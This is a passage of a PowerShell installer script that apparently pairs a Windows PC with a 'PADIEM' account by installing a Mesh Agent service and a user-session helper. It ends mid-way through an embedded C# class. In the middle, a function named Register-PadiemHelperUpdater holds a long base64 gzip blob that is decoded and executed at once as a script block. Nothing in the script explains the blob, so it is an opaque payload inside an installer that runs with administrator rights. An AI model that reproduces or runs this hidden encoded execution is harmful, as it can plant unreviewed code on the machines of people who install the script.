<#
.SYNOPSIS
  Connect this Windows PC to one PADIEM account (#5573 PR-4b).

.DESCRIPTION
  One path, one prompt: type the pairing code the browser showed you, and this
  script asks PADIEM for the installer link and the tag that belongs to that
  code, then installs the agent the way the double-click program does - the
  downloaded agent is copied into %ProgramFiles%\PADIEM, the one "Mesh Agent"
  service is registered from there with -install (a re-run updates it in
  place; a second service is never registered), it is started, and the
  service's own status is read back. The server recognises the tag in the
  agent's name and finishes the pairing - this PC never has to name itself,
  and no account password is ever asked for or stored here.

  It then provisions the optional user-session helper: the deployment's
  versioned helper EXE is downloaded, its SHA-256 checked, and it is placed in
  %ProgramData%\Padiem with a 32-byte secret, a per-user ONLOGON/Limited task
  and a local helper-status.json. That folder is locked first (#7564): only
  SYSTEM and administrators can write there, the console user can read and
  run, a folder another account made first is refused with its reason, and the
  secret is new on every install. A helper that cannot be provisioned never
  undoes the agent connection above.

  Nothing about the pairing is written to disk: the code, the tag and the link
  live in this process only. Re-running the script on an already-installed PC
  skips the download and re-submits the pairing for the code you type now.

.PARAMETER ChatOrigin
  The https origin of your PADIEM Chat, e.g. https://chat.padiem.net

.PARAMETER Code
  Never use this. It exists only so the automated check can exercise the
  validation path; a real run is always prompted, because a command-line value
  lands in shell history.

.EXAMPLE
  Set-ExecutionPolicy -Scope Process Bypass
  .\install-padiem-pc.ps1 -ChatOrigin https://chat.padiem.net
#>
[CmdletBinding()]
param(
  [string] $ChatOrigin = "",
  [string] $Code = "",
  [string] $AgentInstallDir = "${env:ProgramFiles(x86)}\Mesh Services",
  [switch] $DryRun
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$HandoffPath = "/api/pc/pairings/handoff"
$Copy = @{
  Prompt          = "PADIEM에서 표시한 12자리 연결 코드를 입력하세요 (화면에 표시되지 않습니다): "
  BadCode         = "연결 코드 형식이 올바르지 않습니다. 코드를 다시 확인하거나 새 코드를 발급하세요."
  BadOrigin       = "Chat 주소는 https로 시작해야 합니다."
  NotReady        = "서버가 아직 PC 연결 준비 중입니다. 잠시 후 다시 실행하세요."
  Renewing = "이 PC에는 에이전트가 이미 설치되어 있습니다. 같은 서비스 이름으로 갱신 설치합니다(중복 서비스 없음)."
  RenewalLinkMissing = "에이전트가 이미 설치되어 있습니다. 이 배포에는 갱신 설치에 쓰는 설치 링크가 아직 설정되지 않았습니다. 설정이 준비되면 다시 실행하세요."
  RenewalFailed = "에이전트 갱신 설치에 실패했습니다. 기존 연결 설정은 바뀌지 않았습니다. 다시 실행해 주세요."
  Installed       = "에이전트 설치를 시작했습니다. 이름에 연결 표식이 붙고 서버가 이 PC를 확인하면 연결이 완료됩니다."
  Waiting         = "서버 확인 대기 중 — PADIEM의 '내 PC 연결'에서 자동으로 '연결됨'으로 바뀝니다."
  LinkPending     = "이 PC에 에이전트가 아직 없고 서버가 아직 설치 링크를 내려주지 않았습니다. 설치 링크가 준비되면 이 프로그램을 다시 실행하세요. 연결 코드는 10분 안에 만료되니 새 코드로 다시 시도하세요."
  DryRunNote      = "(점검 실행: 설치 프로그램은 실행하지 않았습니다)"
  InstallFailed   = "에이전트 설치를 마치지 못했습니다. 잠시 후 다시 시도해 주세요."
  ElevationNeeded = "관리자 권한 승인 창이 나타나면 [예]를 눌러 주세요. 설치에는 관리자 권한이 필요합니다."
  ElevationRefused = "설치 권한이 거부되었습니다. 이 스크립트를 관리자 권한으로 다시 실행해 주세요."
  ElevationFailed = "PC 연결 설치 프로그램을 실행하지 못했습니다. 잠시 후 다시 시도해 주세요."
  HelperInstalled = "사용자 세션 도우미를 설치했습니다."
  HelperUnavailable = "사용자 세션 도우미는 설치하지 못했습니다. PC 연결은 계속 진행됩니다."
}

# ---- the agent install sequence the double-click program runs ----
# Measured on the tagged Windows agent of 2026-10-28 (PadiemPcConnect.cs):
# -fullinstall exited 0 and registered nothing, while -install registered the
# service from the folder it ran from. So the copy into the product's own
# folder under Program Files is this script's job, and -install runs from
# there - never -fullinstall, never out of a temp folder.
$PadiemAgentServiceName = "Mesh Agent"
# The durable folder lives under the real Program Files. A validation-only
# run on a host without it (CI Linux, pwsh) must reach its own refusal, not
# die here: the install walk below only runs on a Windows PC that has it.
$PadiemAgentDurableDir = if ($env:ProgramFiles) { Join-Path $env:ProgramFiles "PADIEM" } else { $null }
$PadiemAgentDurableExe = if ($PadiemAgentDurableDir) { Join-Path $PadiemAgentDurableDir "MeshAgent.exe" } else { $null }

function Install-PadiemAgentService {
  # Stops an existing service through the binary its own record names, copies
  # the downloaded agent into the durable folder, registers the same single
  # service from there with -install, starts it, and answers whether the
  # service is registered afterwards. Never registers a second service: the
  # name is the one constant above, so a re-run updates in place.
  param([string] $SourceExe, [string] $AgentName)
  $record = "HKLM:\SYSTEM\CurrentControlSet\Services\" + $PadiemAgentServiceName
  $item = Get-ItemProperty -Path $record -Name ImagePath -ErrorAction SilentlyContinue
  $registered = $null
  if ($item) { $registered = ([string] $item.ImagePath).Trim() }
  if ($registered) {
    if ($registered.StartsWith('"')) {
      $closing = $registered.IndexOf('"', 1)
      $registered = if ($closing -gt 1) { $registered.Substring(1, $closing - 1) } else { $null }
    } else {
      $space = $registered.IndexOf(' ')
      $registered = if ($space -ge 0) { $registered.Substring(0, $space) } else { $registered }
    }
  }
  if ($registered -and (Test-Path -LiteralPath $registered)) {
    # The stop is asked of the agent binary itself, the way the double-click
    # program does it; a refusal here is not a failure - the copy below
    # retries over a file a still-running agent holds.
    try {
      Start-Process -FilePath $registered -ArgumentList "-stop" -Wait -WindowStyle Hidden | Out-Null
    } catch { }
  }
  New-Item -ItemType Directory -Path $PadiemAgentDurableDir -Force | Out-Null
  $copied = $false
  for ($attempt = 0; $attempt -lt 3; $attempt++) {
    try {
      Copy-Item -LiteralPath $SourceExe -Destination $PadiemAgentDurableExe -Force
      $copied = $true
      break
    } catch {
      Start-Sleep -Seconds 1
    }
  }
  if (-not $copied) { return $false }
  try {
    $installed = Start-Process -FilePath $PadiemAgentDurableExe -ArgumentList @("-install", ('--agentName="' + $AgentName + '"')) -Wait -PassThru -WindowStyle Hidden
  } catch {
    return $false
  }
  if (-not $installed -or $installed.ExitCode -ne 0) { return $false }
  # -install registers; it does not launch. The start is what makes a fresh PC
  # answer the server's first call instead of waiting for the next restart.
  try {
    Start-Process -FilePath $PadiemAgentDurableExe -ArgumentList "-start" -Wait -WindowStyle Hidden | Out-Null
  } catch { }
  $service = Get-Service -Name $PadiemAgentServiceName -ErrorAction SilentlyContinue
  return ($null -ne $service)
}

function Register-PadiemHelperUpdater {
  $b=[Convert]::FromBase64String('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');$ms=[IO.MemoryStream]::new($b);$gz=[IO.Compression.GZipStream]::new($ms,[IO.Compression.CompressionMode]::Decompress);$reader=[IO.StreamReader]::new($gz);$source=$reader.ReadToEnd();$reader.Dispose();& ([scriptblock]::Create($source)) -Register -SourceText $source
}
# ---- the user-session helper the one-click install also provisions ----
# The helper is a per-user process, not a service: it listens on this PC's
# named pipe and runs one request per process (see claw_connect.user_helper_service).
# It is optional. The MeshCentral agent above is the connection; a helper that
# cannot be provisioned here is recorded in helper-status.json and never undoes
# the agent install or asks for a second elevation.
$PadiemUserHelperTaskName = "PadiemUserSessionHelper"
$PadiemUserHelperTaskFolder = "\Padiem\"
$PadiemUserHelperFileName = "padiem-user-helper.exe"
$PadiemUserHelperStateDir = if ($env:ProgramData) { Join-Path $env:ProgramData "Padiem" } else { $null }
$PadiemUserHelperExe = if ($PadiemUserHelperStateDir) { Join-Path $PadiemUserHelperStateDir $PadiemUserHelperFileName } else { $null }
$PadiemUserHelperSecret = if ($PadiemUserHelperStateDir) { Join-Path $PadiemUserHelperStateDir "helper.secret" } else { $null }
$PadiemUserHelperStatus = if ($PadiemUserHelperStateDir) { Join-Path $PadiemUserHelperStateDir "helper-status.json" } else { $null }
# #7564: who may touch the helper's folder. The ProgramData folder lets every
# local account create files inside a child folder, so nothing here is left to
# inheritance: the folder, the program, the secret and the status each carry
# their own security descriptor. SYSTEM and the Administrators group have full
# control, the console user who runs the helper may read (and run), and no
# other account is named. Accounts are written as SIDs, never as display names
# a localized Windows spells differently. (No percent sign anywhere in this
# block: the server-rendered lane fills its template with one.)
$PadiemHelperSystemSid = "S-1-5-18"
$PadiemHelperAdministratorsSid = "S-1-5-32-544"
$PadiemHelperOwnerSid = $PadiemHelperAdministratorsSid

function Get-PadiemConsoleUser {
  param([ref] $Reason)
  # Never fall back to the elevated installer's identity.
  try {
    $computer = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop
    $name = [string] $computer.UserName
    if ($name -and $name -match '^[^\\/\s]+\\[^\\/\s]+$') { return $name }
    $Reason.Value = "wmi_no_user"
  } catch {
    $Reason.Value = "wmi_failed:" + $_.Exception.GetType().Name
  }
  try {
    if (-not ('PadiemSessionLookup' -as [type])) {
      Add-Type -ErrorAction Stop -TypeDefinition @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
public static class PadiemSessionLookup
{
    const int WTSUserName = 5;
    const int WTSDomainName = 7;
    const int WTSClientProtocolType = 16;
    const int WTSActive = 0;
    const short RdpProtocol = 2;

    [StructLayout(LayoutKind.Sequential)]
    struct SessionInfo
    {
        public uint SessionId;
        public IntPtr StationName;
        public int State;
    }

    [DllImport("kernel32.dll")]
    static extern uint WTSGetActiveConsoleSessionId();

    [DllImport("wtsapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool WTSQuerySessionInformation(IntPtr server, uint sessionId,
        int infoClass, out IntPtr buffer, out int bytes);

    [DllImport("wtsapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool WTSEnumerateSessions(IntPtr server, int reserved,
        int version, out IntPtr sessions, out int count);

    [DllImport("wtsapi32.dll")]
    static extern void WTSFreeMemory(IntPtr buffer);

    static T Query<T>(uint sessionId, int infoClass, Func<IntPtr, int, T> read)
    {
        IntPtr buffer;
        int bytes;
        if (!WTSQuerySessionInformation(IntPtr.Zero, sessionId, infoClass, out buffer, out bytes))
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        try { return read(buffer, bytes); }
        finally { WTSFreeMemory(buffer); }
    }

    static string SessionText(uint sessionId, int infoClass)
    {
        return Query<string>(sessionId, infoClass, delegate(IntPtr buffer, int bytes)
        {
            return bytes > 2 ? Marshal.PtrToStringUni(buffer) : "";
        });
    }

    public static bool ValidName(string name)
    {
        return !string.IsNullOrEmpty(name)
            && Regex.IsMatch(name, @"^[^\\/\s]+\\[^\\/\s]+$", RegexOptions.CultureInvariant);
    }

    static string SessionUser(uint sessionId)
    {
        string user = SessionText(sessionId, WTSUserName);
        string domain = SessionText(sessionId, WTSDomainName);
        string name = domain + "\\" + user;
        return ValidName(name) ? name : null;
    }

    public static string ConsoleUser()
    {
        uint sessionId = WTSGetActiveConsoleSessionId();
        return sessionId == uint.MaxValue ? null : SessionUser(sessionId);
    }

    // The cardinality is for sessions, not unique user names. Never choose
